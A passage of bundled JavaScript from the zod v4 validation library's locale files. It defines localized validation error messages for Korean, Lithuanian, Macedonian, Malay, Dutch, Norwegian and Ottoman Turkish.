        const suffix = adj === "\uBBF8\uB9CC" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue2.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing)
          return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue2.maximum.toString()}${unit} ${adj}${suffix}`;
        return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue2.maximum.toString()} ${adj}${suffix}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\uC774\uC0C1" : "\uCD08\uACFC";
        const suffix = adj === "\uC774\uC0C1" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue2.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing) {
          return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue2.minimum.toString()}${unit} ${adj}${suffix}`;
        }
        return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue2.minimum.toString()} ${adj}${suffix}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.prefix}"(\uC73C)\uB85C \uC2DC\uC791\uD574\uC57C \uD569\uB2C8\uB2E4`;
        }
        if (_issue.format === "ends_with")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.suffix}"(\uC73C)\uB85C \uB05D\uB098\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "includes")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.includes}"\uC744(\uB97C) \uD3EC\uD568\uD574\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "regex")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: \uC815\uADDC\uC2DD ${_issue.pattern} \uD328\uD134\uACFC \uC77C\uCE58\uD574\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\uC798\uBABB\uB41C \uC22B\uC790: ${issue2.divisor}\uC758 \uBC30\uC218\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "unrecognized_keys":
        return `\uC778\uC2DD\uD560 \uC218 \uC5C6\uB294 \uD0A4: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\uC798\uBABB\uB41C \uD0A4: ${issue2.origin}`;
      case "invalid_union":
        return `\uC798\uBABB\uB41C \uC785\uB825`;
      case "invalid_element":
        return `\uC798\uBABB\uB41C \uAC12: ${issue2.origin}`;
      default:
        return `\uC798\uBABB\uB41C \uC785\uB825`;
    }
  };
};
function ko_default() {
  return {
    localeError: error25()
  };
}
// node_modules/zod/v4/locales/lt.js
var capitalizeFirstCharacter = (text) => {
  return text.charAt(0).toUpperCase() + text.slice(1);
};
function getUnitTypeFromNumber(number2) {
  const abs = Math.abs(number2);
  const last = abs % 10;
  const last2 = abs % 100;
  if (last2 >= 11 && last2 <= 19 || last === 0)
    return "many";
  if (last === 1)
    return "one";
  return "few";
}
var error26 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "simbolis",
        few: "simboliai",
        many: "simboli\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne ilgesn\u0117 kaip",
          notInclusive: "turi b\u016Bti trumpesn\u0117 kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne trumpesn\u0117 kaip",
          notInclusive: "turi b\u016Bti ilgesn\u0117 kaip"
        }
      }
    },
    file: {
      unit: {
        one: "baitas",
        few: "baitai",
        many: "bait\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne didesnis kaip",
          notInclusive: "turi b\u016Bti ma\u017Eesnis kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne ma\u017Eesnis kaip",
          notInclusive: "turi b\u016Bti didesnis kaip"
        }
      }
    },
    array: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    },
    set: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    }
  };
  function getSizing(origin, unitType, inclusive, targetShouldBe) {
    const result = Sizable[origin] ?? null;
    if (result === null)
      return result;
    return {
      unit: result.unit[unitType],
      verb: result.verb[targetShouldBe][inclusive ? "inclusive" : "notInclusive"]
    };
  }
  const FormatDictionary = {
    regex: "\u012Fvestis",
    email: "el. pa\u0161to adresas",
    url: "URL",
    emoji: "jaustukas",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO data ir laikas",
    date: "ISO data",
    time: "ISO laikas",
    duration: "ISO trukm\u0117",
    ipv4: "IPv4 adresas",
    ipv6: "IPv6 adresas",
    cidrv4: "IPv4 tinklo prefiksas (CIDR)",
    cidrv6: "IPv6 tinklo prefiksas (CIDR)",
    base64: "base64 u\u017Ekoduota eilut\u0117",
    base64url: "base64url u\u017Ekoduota eilut\u0117",
    json_string: "JSON eilut\u0117",
    e164: "E.164 numeris",
    jwt: "JWT",
    template_literal: "\u012Fvestis"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "skai\u010Dius",
    bigint: "sveikasis skai\u010Dius",
    string: "eilut\u0117",
    boolean: "login\u0117 reik\u0161m\u0117",
    undefined: "neapibr\u0117\u017Eta reik\u0161m\u0117",
    function: "funkcija",
    symbol: "simbolis",
    array: "masyvas",
    object: "objektas",
    null: "nulin\u0117 reik\u0161m\u0117"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Gautas tipas ${received}, o tik\u0117tasi - instanceof ${issue2.expected}`;
        }
        return `Gautas tipas ${received}, o tik\u0117tasi - ${expected}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Privalo b\u016Bti ${stringifyPrimitive(issue2.values[0])}`;
        return `Privalo b\u016Bti vienas i\u0161 ${joinValues(issue2.values, "|")} pasirinkim\u0173`;
      case "too_big": {
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        const sizing = getSizing(issue2.origin, getUnitTypeFromNumber(Number(issue2.maximum)), issue2.inclusive ?? false, "smaller");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue2.maximum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue2.inclusive ? "ne didesnis kaip" : "ma\u017Eesnis kaip";
        return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue2.maximum.toString()} ${sizing?.unit}`;
      }
      case "too_small": {
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        const sizing = getSizing(issue2.origin, getUnitTypeFromNumber(Number(issue2.minimum)), issue2.inclusive ?? false, "bigger");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue2.minimum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue2.inclusive ? "ne ma\u017Eesnis kaip" : "didesnis kaip";
        return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue2.minimum.toString()} ${sizing?.unit}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Eilut\u0117 privalo prasid\u0117ti "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Eilut\u0117 privalo pasibaigti "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Eilut\u0117 privalo \u012Ftraukti "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Eilut\u0117 privalo atitikti ${_issue.pattern}`;
        return `Neteisingas ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Skai\u010Dius privalo b\u016Bti ${issue2.divisor} kartotinis.`;
      case "unrecognized_keys":
        return `Neatpa\u017Eint${issue2.keys.length > 1 ? "i" : "as"} rakt${issue2.keys.length > 1 ? "ai" : "as"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return "Rastas klaidingas raktas";
      case "invalid_union":
        return "Klaidinga \u012Fvestis";
      case "invalid_element": {
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} turi klaiding\u0105 \u012Fvest\u012F`;
      }
      default:
        return "Klaidinga \u012Fvestis";
    }
  };
};
function lt_default() {
  return {
    localeError: error26()
  };
}
// node_modules/zod/v4/locales/mk.js
var error27 = () => {
  const Sizable = {
    string: { unit: "\u0437\u043D\u0430\u0446\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    file: { unit: "\u0431\u0430\u0458\u0442\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    array: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    set: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u043D\u0435\u0441",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u043D\u0430 \u0435-\u043F\u043E\u0448\u0442\u0430",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u045F\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0443\u043C \u0438 \u0432\u0440\u0435\u043C\u0435",
    date: "ISO \u0434\u0430\u0442\u0443\u043C",
    time: "ISO \u0432\u0440\u0435\u043C\u0435",
    duration: "ISO \u0432\u0440\u0435\u043C\u0435\u0442\u0440\u0430\u0435\u045A\u0435",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441\u0430",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441\u0430",
    cidrv4: "IPv4 \u043E\u043F\u0441\u0435\u0433",
    cidrv6: "IPv6 \u043E\u043F\u0441\u0435\u0433",
    base64: "base64-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    base64url: "base64url-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    json_string: "JSON \u043D\u0438\u0437\u0430",
    e164: "E.164 \u0431\u0440\u043E\u0458",
    jwt: "JWT",
    template_literal: "\u0432\u043D\u0435\u0441"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0431\u0440\u043E\u0458",
    array: "\u043D\u0438\u0437\u0430"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 instanceof ${issue2.expected}, \u043F\u0440\u0438\u043C\u0435\u043D\u043E ${received}`;
        }
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${expected}, \u043F\u0440\u0438\u043C\u0435\u043D\u043E ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0413\u0440\u0435\u0448\u0430\u043D\u0430 \u043E\u043F\u0446\u0438\u0458\u0430: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 \u0435\u0434\u043D\u0430 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0438"}`;
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u043F\u043E\u0447\u043D\u0443\u0432\u0430 \u0441\u043E "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u0432\u0440\u0448\u0443\u0432\u0430 \u0441\u043E "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0432\u043A\u043B\u0443\u0447\u0443\u0432\u0430 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u043E\u0434\u0433\u043E\u0430\u0440\u0430 \u043D\u0430 \u043F\u0430\u0442\u0435\u0440\u043D\u043E\u0442 ${_issue.pattern}`;
        return `Invalid ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0431\u0440\u043E\u0458: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0431\u0438\u0434\u0435 \u0434\u0435\u043B\u0438\u0432 \u0441\u043E ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D\u0438 \u043A\u043B\u0443\u0447\u0435\u0432\u0438" : "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D \u043A\u043B\u0443\u0447"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u043A\u043B\u0443\u0447 \u0432\u043E ${issue2.origin}`;
      case "invalid_union":
        return "\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441";
      case "invalid_element":
        return `\u0413\u0440\u0435\u0448\u043D\u0430 \u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442 \u0432\u043E ${issue2.origin}`;
      default:
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441`;
    }
  };
};
function mk_default() {
  return {
    localeError: error27()
  };
}
// node_modules/zod/v4/locales/ms.js
var error28 = () => {
  const Sizable = {
    string: { unit: "aksara", verb: "mempunyai" },
    file: { unit: "bait", verb: "mempunyai" },
    array: { unit: "elemen", verb: "mempunyai" },
    set: { unit: "elemen", verb: "mempunyai" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "alamat e-mel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tarikh masa ISO",
    date: "tarikh ISO",
    time: "masa ISO",
    duration: "tempoh ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "julat IPv4",
    cidrv6: "julat IPv6",
    base64: "string dikodkan base64",
    base64url: "string dikodkan base64url",
    json_string: "string JSON",
    e164: "nombor E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "nombor"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Input tidak sah: dijangka instanceof ${issue2.expected}, diterima ${received}`;
        }
        return `Input tidak sah: dijangka ${expected}, diterima ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Input tidak sah: dijangka ${stringifyPrimitive(issue2.values[0])}`;
        return `Pilihan tidak sah: dijangka salah satu daripada ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Terlalu besar: dijangka ${issue2.origin ?? "nilai"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: dijangka ${issue2.origin ?? "nilai"} adalah ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Terlalu kecil: dijangka ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: dijangka ${issue2.origin} adalah ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `String tidak sah: mesti bermula dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak sah: mesti berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak sah: mesti mengandungi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak sah: mesti sepadan dengan corak ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} tidak sah`;
      }
      case "not_multiple_of":
        return `Nombor tidak sah: perlu gandaan ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak sah dalam ${issue2.origin}`;
      case "invalid_union":
        return "Input tidak sah";
      case "invalid_element":
        return `Nilai tidak sah dalam ${issue2.origin}`;
      default:
        return `Input tidak sah`;
    }
  };
};
function ms_default() {
  return {
    localeError: error28()
  };
}
// node_modules/zod/v4/locales/nl.js
var error29 = () => {
  const Sizable = {
    string: { unit: "tekens", verb: "heeft" },
    file: { unit: "bytes", verb: "heeft" },
    array: { unit: "elementen", verb: "heeft" },
    set: { unit: "elementen", verb: "heeft" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "invoer",
    email: "emailadres",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum en tijd",
    date: "ISO datum",
    time: "ISO tijd",
    duration: "ISO duur",
    ipv4: "IPv4-adres",
    ipv6: "IPv6-adres",
    cidrv4: "IPv4-bereik",
    cidrv6: "IPv6-bereik",
    base64: "base64-gecodeerde tekst",
    base64url: "base64 URL-gecodeerde tekst",
    json_string: "JSON string",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "invoer"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "getal"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ongeldige invoer: verwacht instanceof ${issue2.expected}, ontving ${received}`;
        }
        return `Ongeldige invoer: verwacht ${expected}, ontving ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ongeldige invoer: verwacht ${stringifyPrimitive(issue2.values[0])}`;
        return `Ongeldige optie: verwacht \xE9\xE9n van ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        const longName = issue2.origin === "date" ? "laat" : issue2.origin === "string" ? "lang" : "groot";
        if (sizing)
          return `Te ${longName}: verwacht dat ${issue2.origin ?? "waarde"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementen"} ${sizing.verb}`;
        return `Te ${longName}: verwacht dat ${issue2.origin ?? "waarde"} ${adj}${issue2.maximum.toString()} is`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        const shortName = issue2.origin === "date" ? "vroeg" : issue2.origin === "string" ? "kort" : "klein";
        if (sizing) {
          return `Te ${shortName}: verwacht dat ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} ${sizing.verb}`;
        }
        return `Te ${shortName}: verwacht dat ${issue2.origin} ${adj}${issue2.minimum.toString()} is`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Ongeldige tekst: moet met "${_issue.prefix}" beginnen`;
        }
        if (_issue.format === "ends_with")
          return `Ongeldige tekst: moet op "${_issue.suffix}" eindigen`;
        if (_issue.format === "includes")
          return `Ongeldige tekst: moet "${_issue.includes}" bevatten`;
        if (_issue.format === "regex")
          return `Ongeldige tekst: moet overeenkomen met patroon ${_issue.pattern}`;
        return `Ongeldig: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ongeldig getal: moet een veelvoud van ${issue2.divisor} zijn`;
      case "unrecognized_keys":
        return `Onbekende key${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ongeldige key in ${issue2.origin}`;
      case "invalid_union":
        return "Ongeldige invoer";
      case "invalid_element":
        return `Ongeldige waarde in ${issue2.origin}`;
      default:
        return `Ongeldige invoer`;
    }
  };
};
function nl_default() {
  return {
    localeError: error29()
  };
}
// node_modules/zod/v4/locales/no.js
var error30 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "\xE5 ha" },
    file: { unit: "bytes", verb: "\xE5 ha" },
    array: { unit: "elementer", verb: "\xE5 inneholde" },
    set: { unit: "elementer", verb: "\xE5 inneholde" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "e-postadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkeslett",
    date: "ISO-dato",
    time: "ISO-klokkeslett",
    duration: "ISO-varighet",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spekter",
    cidrv6: "IPv6-spekter",
    base64: "base64-enkodet streng",
    base64url: "base64url-enkodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "tall",
    array: "liste"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ugyldig input: forventet instanceof ${issue2.expected}, fikk ${received}`;
        }
        return `Ugyldig input: forventet ${expected}, fikk ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ugyldig verdi: forventet ${stringifyPrimitive(issue2.values[0])}`;
        return `Ugyldig valg: forventet en av ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `For stor(t): forventet ${issue2.origin ?? "value"} til \xE5 ha ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor(t): forventet ${issue2.origin ?? "value"} til \xE5 ha ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `For lite(n): forventet ${issue2.origin} til \xE5 ha ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `For lite(n): forventet ${issue2.origin} til \xE5 ha ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: m\xE5 starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: m\xE5 ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: m\xE5 inneholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: m\xE5 matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ugyldig tall: m\xE5 v\xE6re et multiplum av ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Ukjente n\xF8kler" : "Ukjent n\xF8kkel"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8kkel i ${issue2.origin}`;
      case "invalid_union":
        return "Ugyldig input";
      case "invalid_element":
        return `Ugyldig verdi i ${issue2.origin}`;
      default:
        return `Ugyldig input`;
    }
  };
};
function no_default() {
  return {
    localeError: error30()
  };
}
// node_modules/zod/v4/locales/ota.js
var error31 = () => {
  const Sizable = {
    string: { unit: "harf", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "unsur", verb: "olmal\u0131d\u0131r" },
    set: { unit: "unsur", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "giren",
    email: "epostag\xE2h",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO heng\xE2m\u0131",
    date: "ISO tarihi",
    time: "ISO zaman\u0131",
    duration: "ISO m\xFCddeti",
    ipv4: "IPv4 ni\u015F\xE2n\u0131",
